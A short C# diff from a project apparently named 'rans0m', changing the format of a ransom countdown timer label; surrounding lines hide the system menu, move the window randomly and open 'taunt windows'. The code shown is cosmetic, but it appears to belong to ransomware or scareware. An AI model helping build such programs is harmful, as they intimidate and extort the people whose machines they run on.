@@ -27,7 +27,7 @@ namespace rans0m
             Global.HideSystemMenu(this);
 
             // Init the window
-            txt_timer.Text = $"TIME: {Global.ransomTimeLeft / 60:D2}:{Global.ransomTimeLeft % 60:D2}";
+            txt_timer.Text = $"{Global.ransomTimeLeft / 60:D2}:{Global.ransomTimeLeft % 60:D2}";
             Global.RandomPosWindow(this);
 
             // Init 9 taunt windows
